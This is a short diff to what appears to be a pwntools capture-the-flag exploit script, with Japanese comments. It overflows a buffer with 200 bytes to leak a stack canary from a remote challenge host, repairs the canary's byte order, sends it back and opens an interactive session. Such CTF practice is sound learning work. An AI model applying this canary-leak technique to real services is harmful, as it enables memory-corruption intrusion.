@@ -11,7 +11,7 @@ host = '34.170.146.252'
 port = 37891
 
 gdbscript = '''
-b *vuln+167
+b *main
 c
 '''
 
@@ -33,11 +33,11 @@ def main():
     r.sendlineafter(b"Input:", b"a" * 200) #最後に改行も送る
     r.recvuntil(b'a'*200 + b'\x0a') #先に読み取るがこれは変数に保存していないからごみ
     #leaked = r.recvline().strip() #末尾がくるまで受け取って最後の末尾を消している
-    leaked = r.recv(7) + b"\00"
+    leaked = b"\00" + r.recv(7)
 
     print(f'canary: {(leaked)}')
 
-    r.sendlineafter(b"Canary?", leaked) #改行を追加せずに送る。
+    r.sendafter(b"Canary?", leaked) #改行を追加せずに送る。
 
     r.interactive()
 
